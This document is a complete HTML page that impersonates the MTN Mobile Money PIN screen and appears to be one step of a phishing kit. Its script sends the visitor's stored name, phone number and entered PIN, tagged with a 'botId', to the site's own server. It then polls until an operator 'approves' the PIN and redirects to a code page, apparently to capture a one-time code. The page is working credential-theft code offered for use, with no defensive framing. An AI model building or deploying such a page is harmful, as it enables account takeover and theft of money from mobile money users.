<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>MTN MoMo - PIN</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }
    body {
      background: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 0;
    }
    .app-wrapper {
      width: 100%;
      max-width: 420px;
      background: #fff;
      min-height: 100vh;
      position: relative;
      box-shadow: 0 0 20px rgba(0,0,0,0.05);
    }
    .top-bar {
      height: 72px;
      background: #FFCC00;
      display: flex;
      align-items: center;
      padding: 0 22px;
      flex-shrink: 0;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    .top-bar .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .top-bar .logo svg {
      height: 36px;
      width: auto;
    }
    .top-bar .logo span {
      font-weight: 700;
      font-size: 18px;
      color: #004B87;
      letter-spacing: -0.5px;
    }
    .back-btn {
      color: #004B87;
      font-size: 30px;
      text-decoration: none;
      font-weight: 300;
      background: none;
      border: none;
      padding: 0;
      cursor: pointer;
      margin-right: 16px;
    }
    .container {
      padding: 28px 24px 100px;
      display: flex;
      flex-direction: column;
    }
    .title {
      font-size: 26px;
      font-weight: 700;
      color: #004B87;
      margin-bottom: 4px;
      letter-spacing: -0.3px;
    }
    .subtitle {
      font-size: 15px;
      color: #555;
      margin-bottom: 28px;
      line-height: 1.5;
    }
    .pin-box-wrapper {
      background: #fafafa;
      border-radius: 18px;
      padding: 22px 16px;
      margin-bottom: 20px;
      border: 1px solid #eee;
      position: relative;
      cursor: pointer;
      touch-action: manipulation;
    }
    .pin-row {
      display: flex;
      justify-content: center;
      gap: 14px;
      align-items: center;
    }
    .pin-box {
      width: 56px;
      height: 56px;
      border-radius: 12px;
      border: 2px solid #d0d7de;
      background: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      font-weight: 600;
      color: #004B87;
      transition: border-color 0.3s, box-shadow 0.2s;
    }
    .pin-box.filled {
      border-color: #FFCC00;
      box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.3);
    }
    .lock-icon {
      width: 56px;
      height: 56px;
      border-radius: 12px;
      border: 2px dashed #d0d7de;
      background: #f9f9f9;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 26px;
      color: #aaa;
    }
    #pinInput {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;
      background: transparent;
      border: none;
      outline: none;
      cursor: pointer;
      font-size: 16px;
    }
    #otp-alert {
      text-align: center;
      font-size: 15px;
      font-weight: 500;
      min-height: 24px;
      margin-bottom: 12px;
      padding: 10px 12px;
      border-radius: 8px;
      background: transparent;
      transition: all 0.2s;
    }
    #otp-alert.error {
      background: #fde7e7;
      color: #b00020;
      border: 1px solid #f5c6cb;
    }
    #otp-alert.success {
      background: #e7f5e7;
      color: #1e7e34;
      border: 1px solid #b7d7b7;
    }
    #waiting {
      text-align: center;
      font-size: 14px;
      color: #004B87;
      margin-top: 8px;
      display: none;
      padding: 10px;
      border-radius: 8px;
      background: #e8f0fe;
      border: 1px solid #bbd4f0;
    }
    .continue-btn {
      position: fixed;
      left: 24px;
      right: 24px;
      bottom: 28px;
      width: auto;
      max-width: 420px;
      margin: 0 auto;
      height: 56px;
      font-size: 20px;
      font-weight: 700;
      border-radius: 10px;
      border: none;
      cursor: not-allowed;
      transition: background 0.2s, transform 0.1s;
      background: #ccc;
      color: #fff;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      left: 50%;
      transform: translateX(-50%);
    }
    .continue-btn:enabled {
      background: #FFCC00;
      color: #004B87;
      cursor: pointer;
    }
    .continue-btn:enabled:hover {
      background: #e6b800;
      transform: translateX(-50%) scale(1.01);
    }
    .continue-btn.waiting {
      background: #f5a623;
      color: #fff;
      opacity: 1;
      cursor: default;
    }
    .footer {
      margin-top: 24px;
      text-align: center;
      font-size: 12px;
      color: #bbb;
      letter-spacing: 0.5px;
      padding-bottom: 12px;
    }
    @media (max-width: 480px) {
      .container {
        padding: 24px 18px 100px;
      }
      .title {
        font-size: 24px;
      }
      .pin-box {
        width: 50px;
        height: 50px;
        font-size: 24px;
      }
      .lock-icon {
        width: 50px;
        height: 50px;
        font-size: 22px;
      }
      .continue-btn {
        height: 54px;
        font-size: 18px;
        left: 18px;
        right: 18px;
      }
    }
    @media (max-width: 360px) {
      .pin-box {
        width: 44px;
        height: 44px;
        font-size: 20px;
      }
      .lock-icon {
        width: 44px;
        height: 44px;
        font-size: 18px;
      }
      .pin-row {
        gap: 10px;
      }
    }
  </style>
</head>
<body>

<div class="app-wrapper">
  <div class="top-bar">
    <button class="back-btn" onclick="window.history.back()">&#8592;</button>
    <div class="logo">
      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN </text>
      </svg>
      <span>Mobile Money</span>
    </div>
  </div>
  <div class="container">
    <div class="title">Enter Your MoMo PIN</div>
    <div class="subtitle">Enter your 4‑digit PIN</div>

    <div class="pin-box-wrapper">
      <div class="pin-row">
        <div class="pin-box" id="b1"></div>
        <div class="pin-box" id="b2"></div>
        <div class="pin-box" id="b3"></div>
        <div class="pin-box" id="b4"></div>
        <div class="lock-icon">🔒</div>
      </div>
      <input id="pinInput" type="tel" inputmode="numeric" maxlength="4" autofocus />
    </div>

    <div id="otp-alert"></div>
    <div id="waiting">⏳ Awaiting approval…</div>
    <div class="footer">v 5.3.2 (1.0.0)</div>
  </div>

  <button id="verifyBtn" class="continue-btn" disabled>SUBMIT</button>
</div>

<script>
(function() {
  const input = document.getElementById('pinInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const waitingEl = document.getElementById('waiting');
  const alertEl = document.getElementById('otp-alert');
  const boxes = [
    document.getElementById('b1'),
    document.getElementById('b2'),
    document.getElementById('b3'),
    document.getElementById('b4')
  ];

  const fullName = localStorage.getItem('fullName') || localStorage.getItem('name') || 'MTN User';
  const phone = localStorage.getItem('phone');
  const params = new URLSearchParams(window.location.search);
  let botId = params.get('botId') || localStorage.getItem('botId');
  if (botId) localStorage.setItem('botId', botId);

  if (!phone || !botId) {
    alert('Session expired. Please start over.');
    window.location.href = 'index.html';
    return;
  }

  function focusPin() { input.focus(); }

  function updateBoxes(value) {
    const digits = value.padEnd(4, '');
    boxes.forEach((box, i) => {
      if (digits[i]) {
        box.textContent = '●';
        box.classList.add('filled');
      } else {
        box.textContent = '';
        box.classList.remove('filled');
      }
    });
  }

  input.addEventListener('input', () => {
    input.value = input.value.replace(/\D/g, '').slice(0, 4);
    updateBoxes(input.value);
    verifyBtn.disabled = input.value.length !== 4;
    alertEl.textContent = '';
    alertEl.className = '';
  });

  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    const digits = paste.replace(/\D/g, '').slice(0, 4);
    input.value = digits;
    updateBoxes(digits);
    verifyBtn.disabled = digits.length !== 4;
    if (digits.length === 4) {
      setTimeout(() => verifyBtn.click(), 300);
    }
  });

  function showAlert(text, type = 'error') {
    alertEl.textContent = text;
    alertEl.className = type;
  }

  verifyBtn.addEventListener('click', async () => {
    const pin = input.value;
    if (pin.length !== 4) return;

    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Awaiting…';
    verifyBtn.classList.add('waiting');
    waitingEl.style.display = 'block';
    showAlert('', '');

    try {
      const res = await fetch(`${window.location.origin}/submit-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: fullName, phone, pin, botId })
      });
      if (!res.ok) throw new Error('Server error');
      const data = await res.json();
      if (!data.requestId) throw new Error('No ID received');
      pollPin(data.requestId);
    } catch (error) {
      waitingEl.style.display = 'none';
      verifyBtn.disabled = false;
      verifyBtn.textContent = 'SUBMIT';
      verifyBtn.classList.remove('waiting');
      showAlert('❌ Server error. Please try again.', 'error');
    }
  });

  function pollPin(requestId) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
        const data = await res.json();
        if (data.approved === true) {
          clearInterval(interval);
          window.location.href = 'code.html';
        }
        if (data.approved === false || data.blocked) {
          clearInterval(interval);
          input.value = '';
          boxes.forEach(b => { b.textContent = ''; b.classList.remove('filled'); });
          verifyBtn.disabled = true;
          verifyBtn.textContent = 'SUBMIT';
          verifyBtn.classList.remove('waiting');
          waitingEl.style.display = 'none';
          showAlert('❌ Incorrect PIN. Please try again.', 'error');
          focusPin();
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000);
  }

  window.onload = () => focusPin();
})();
</script>

</body>
</html>
